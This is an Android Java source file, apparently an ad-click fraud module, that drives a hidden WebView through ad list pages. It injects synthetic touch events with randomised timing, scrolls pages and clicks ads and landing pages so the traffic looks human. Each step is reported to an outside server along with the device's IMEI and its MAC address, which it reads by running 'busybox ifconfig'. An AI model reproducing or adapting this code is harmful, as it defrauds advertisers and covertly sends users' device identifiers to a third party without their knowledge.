package com.zzj.kp;

import android.app.Activity;
import android.content.Context;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.MotionEvent;
import android.view.WindowManager;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HTTP;
import org.apache.http.util.EntityUtils;

public class WebBdManager
{
	private static final String TAG = "AdList-->";
	private static WebBdManager instance = null;
	private static Activity mActivity;
	private WebView mWeb;
	private List<AdsLinkNode> linkUrls;
	private int priority;
	private int width;//屏幕宽度
	private int height;//屏幕高度
	private float density;//屏幕密度
	private int listCurrent = 0;//当前第n条大连
	private int detailNum = 0;//详情页最大点击次数
	private int detailCurrent = 0;//详情页当前第n次
	private int visitNum = 0;//广告列表页最大点击次数
	private int visitCurrent = 0;//广告列表页当前第n次
	public String date = "";

	public static WebBdManager initWebView(Activity activity, WebView webView, List<AdsLinkNode> urls, int priority)
	{
		if (instance == null)
		{
			instance = new WebBdManager(activity, webView, urls, priority);
		}
		return instance;
	}

	private WebBdManager(Activity activity, WebView webView, List<AdsLinkNode> urls, final int priority)
	{
		if(urls==null||urls.size()==0) return;
		mActivity = activity;
		linkUrls = urls;
		mWeb = webView;
		mActivity.runOnUiThread(new Runnable()
		{
			@Override
			public void run()
			{
				mWeb.setWebViewClient(new WebViewClient(){
					@Override
					public boolean shouldOverrideUrlLoading(WebView view, String url)
					{
						view.loadUrl(url);
						return true;
					}
				});
				
				SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd");
				Date curDate = new Date(System.currentTimeMillis());
				date = formatter.format(curDate);
				if(WebBdManager.this.priority==0){
					WebBdManager.this.priority = priority;
					WindowManager wm = mActivity.getWindowManager();
					width = wm.getDefaultDisplay().getWidth();
					height = wm.getDefaultDisplay().getHeight();
					DisplayMetrics mDisplayMetrics = mActivity.getResources().getDisplayMetrics();
					density = mDisplayMetrics.density;
					takeReport(1, 0);
					mWeb.post(loadListRunnable);
				}
			}
		});
	}

	/**
	 * 加载列表页
	 */
	Runnable loadListRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			listCurrent = 0;
			detailCurrent = 0;
			visitCurrent = 0;
			mWeb.removeCallbacks(loadListRunnable);
			mWeb.removeCallbacks(scrollDetailRunnable1);
			mWeb.removeCallbacks(scrollDetailRunnable3);
			mWeb.removeCallbacks(clickListRunnable);
			mWeb.removeCallbacks(clickDetailRunnable);
			mWeb.removeCallbacks(scrollAdRunnable);
			mWeb.removeCallbacks(clickAdRunnable);
			mWeb.removeCallbacks(backAdRunnable);

			listCurrent = mActivity.getSharedPreferences("bdAdrunToday", Activity.MODE_PRIVATE).getInt(date, 0);

			if(linkUrls.size()==0|| linkUrls.size()<=listCurrent){
//				Toast.makeText(mActivity, "空跑结束", Toast.LENGTH_LONG).show();
				Log.d(TAG, "ad is over");
				takeReport(2, 0);
				AdsDataManager.initWebView(mActivity, mWeb).over(priority);
			}else{
				mWeb.loadUrl(linkUrls.get(listCurrent).getUrl());
				detailNum = linkUrls.get(listCurrent).getDetailNum();
				visitNum = linkUrls.get(listCurrent).getNum();
				takeReport(3, linkUrls.get(listCurrent).getId());
				listCurrent++;
				mActivity.getSharedPreferences("bdAdrunToday", Activity.MODE_PRIVATE).edit().clear().commit();
				mActivity.getSharedPreferences("bdAdrunToday", Activity.MODE_PRIVATE).edit().putInt(date, listCurrent).commit();
//				Toast.makeText(mActivity, "开始第"+listCurrent+"条大链", Toast.LENGTH_LONG).show();
				Log.d(TAG, "step：1");
				mWeb.postDelayed(clickListRunnable, random(9, 13)*1000);
				if(random(0, 100)>50){
					mWeb.postDelayed(scrollDetailRunnable1, random(17, 19)*1000);
					mWeb.postDelayed(scrollDetailRunnable3, random(23, 25)*1000);
					mWeb.postDelayed(clickDetailRunnable, random(28, 32)*1000);
				}else{
					mWeb.postDelayed(loadListRunnable, random(17, 19)*1000);
				}
			}
		}
	};
	
	/**
	 * 列表页模拟点击
	 */
	Runnable clickListRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：2");
//			Toast.makeText(mActivity, "首页的点击", Toast.LENGTH_SHORT).show();
			mockClick(random(500, height-500));
			takeReport(4, linkUrls.get(listCurrent-1).getId());
		}
	};
	
	/**
	 * 详情页下滑随机高度
	 */
	Runnable scrollDetailRunnable1 = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：3.1");
//			Toast.makeText(mActivity, "详情页下拉随机高度", Toast.LENGTH_SHORT).show();
			mWeb.scrollTo(0, 1000*random(1, 5));
		}
	};
	
	/**
	 * 详情页下滑到底部
	 */
	Runnable scrollDetailRunnable3 = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：3.2");
//			Toast.makeText(mActivity, "详情页下拉置底", Toast.LENGTH_SHORT).show();
			mWeb.scrollTo(0, 1000*1000);
		}
	};
	
	/**
	 * 详情页模拟点击
	 */
	Runnable clickDetailRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：4");
//			Toast.makeText(mActivity, "详情页点击", Toast.LENGTH_SHORT).show();
			detailCurrent++;
			if(detailCurrent < detailNum){
				int random = random(0, 3);
				Log.d(TAG, "random："+random);
				switch (random)
				{
				case 0:
					if(density>=3.5){
						mockClick(height / 2 - 550);
					}else{
						mockClick(height / 2 - 400);
					}
					takeReport(4, linkUrls.get(listCurrent-1).getId());
					mWeb.postDelayed(scrollDetailRunnable1, random(4, 6)*1000);
					mWeb.postDelayed(scrollDetailRunnable3, random(11, 13)*1000);
					mWeb.postDelayed(clickDetailRunnable, random(16, 19)*1000);
					break;
				case 1:
					mockClick(height / 2 - 150);
					takeReport(5, linkUrls.get(listCurrent-1).getId());
					adOperate();
					break;
				case 2:
					if(density>=3.5){
						mockClick(height / 2 + 250);
					}else{
						mockClick(height / 2 + 100);
					}
					takeReport(4, linkUrls.get(listCurrent-1).getId());
					mWeb.postDelayed(scrollDetailRunnable1, random(4, 6)*1000);
					mWeb.postDelayed(scrollDetailRunnable3, random(11, 13)*1000);
					mWeb.postDelayed(clickDetailRunnable, random(16, 19)*1000);
					break;
				default:
					break;
				}
			}else if(detailCurrent == detailNum){
				mockClick(height / 2 - 125);
				takeReport(5, linkUrls.get(listCurrent-1).getId());
				adOperate();
			}
		}
	};
	
	/**
	 * 广告页下滑随机高度
	 */
	Runnable scrollAdRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：5");
//			Toast.makeText(mActivity, "广告列表页下滑", Toast.LENGTH_SHORT).show();
			mWeb.scrollTo(0, visitCurrent *500);
		}
	};
	
	/**
	 * 广告页模拟点击
	 */
	Runnable clickAdRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：6");
//			Toast.makeText(mActivity, "广告页模拟点击", Toast.LENGTH_SHORT).show();
			mockClick(random(500, height-500));
			takeReport(6, linkUrls.get(listCurrent-1).getId());
		}
	};

	/**
	 * 广告页模拟点击
	 */
	Runnable clickLdRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：7");
//			Toast.makeText(mActivity, "落地页模拟点击", Toast.LENGTH_SHORT).show();
			mockClick(random(500, height-500));
		}
	};

	/**
	 * 返回广告页
	 */
	Runnable backAdRunnable = new Runnable()
	{
		@Override
		public void run()
		{
			Log.d(TAG, "step：8");
//			Toast.makeText(mActivity, "广告页返回", Toast.LENGTH_SHORT).show();
			mWeb.goBack();
			adOperate();
		}
	};
	
	/**
	 * 广告点击后的操作
	 */
	private void adOperate(){
		visitCurrent++;
		if(visitCurrent <= visitNum){
			if(random(0, 100)>70){
				mWeb.postDelayed(scrollAdRunnable, random(10, 15)*1000);
			}
			mWeb.postDelayed(clickAdRunnable, random(20, 25)*1000);
			mWeb.postDelayed(clickLdRunnable, random(25, 40)*1000);
			mWeb.postDelayed(backAdRunnable, random(40, 45)*1000);
		}else{
			mWeb.postDelayed(loadListRunnable, random(5, 10)*1000);
		}
	}
	
	/**
	 * 模拟点击
	 * @param yPoint  //模拟点击的XY位置
	 */
	private void mockClick(int yPoint)
	{
		long downTime = SystemClock.uptimeMillis();
		MotionEvent downEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_DOWN, random(0, width), yPoint, 0);
		downTime += 1000;
		MotionEvent upEvent = MotionEvent.obtain(downTime, downTime, MotionEvent.ACTION_UP, random(0, width), yPoint, 0);

		mWeb.onTouchEvent(downEvent);
		mWeb.onTouchEvent(upEvent);
		downEvent.recycle();
		upEvent.recycle();
	}

	/**
	 * 获取随机数
	 */
	private int random(int start, int end)
	{
		return (int) (start + Math.random() * (end - start));
	}

	/**
	 * 统计上报
	 */
	public void takeReport(final int act, final int urlid)
	{
		new Thread(new Runnable()
		{

			@Override
			public void run()
			{
				String reportUrl = "http://ad.92boy.com:8017/api.php?do=ckRetBd";
				HttpPost httpPost = new HttpPost(reportUrl);
				List<NameValuePair> params = new ArrayList<NameValuePair>();
				HttpResponse httpResponse = null;
				try
				{
					TelephonyManager tm = (TelephonyManager) mWeb.getContext().getSystemService(Context.TELEPHONY_SERVICE);
					String app_pkg = change(mWeb.getContext().getPackageName());
					params.add(new BasicNameValuePair("app_pkg", app_pkg));
					params.add(new BasicNameValuePair("app_ver", change(mWeb.getContext().getPackageManager().getPackageInfo(app_pkg, 0).versionName)));
					params.add(new BasicNameValuePair("imei", change(tm.getDeviceId())));
					params.add(new BasicNameValuePair("mac", change(getMacAddress())));
					params.add(new BasicNameValuePair("urlid", urlid + ""));
					params.add(new BasicNameValuePair("num", act + ""));

					httpPost.setEntity(new UrlEncodedFormEntity(params, HTTP.UTF_8));
					httpResponse = new DefaultHttpClient().execute(httpPost);
					if (httpResponse.getStatusLine().getStatusCode() == 200)
					{
						String result = EntityUtils.toString(httpResponse.getEntity());
						Log.d("AdList-->", result.toString());
					}
				}
				catch (Exception e)
				{
					e.printStackTrace();
				}
			}
		}).start();
	}
	
	private String change(String ss)
	{
		if (ss == null || ss.length() == 0)
		{
			ss = "";
		}
		return ss;
	}

	// 获取mac地址
	private String getMacAddress()
	{
		String result = "";
		String Mac = "";
		result = callCmd("busybox ifconfig", "HWaddr");
		if (result == null) { return ""; }
		if (result.length() > 0 && result.contains("HWaddr"))
		{
			Mac = result.substring(result.indexOf("HWaddr") + 6, result.length() - 1);
			if (Mac.length() > 1)
			{
				result = Mac.toLowerCase();
			}
		}
		return result.trim();
	}

	private String callCmd(String cmd, String filter)
	{
		String result = "";
		String line = "";
		try
		{
			Process proc = Runtime.getRuntime().exec(cmd);
			InputStreamReader is = new InputStreamReader(proc.getInputStream());
			BufferedReader br = new BufferedReader(is);
			while ((line = br.readLine()) != null && line.contains(filter) == false)
			{
			}
			result = line;
		}
		catch (Exception e)
		{
			e.printStackTrace();
		}
		return result;
	}
	
}
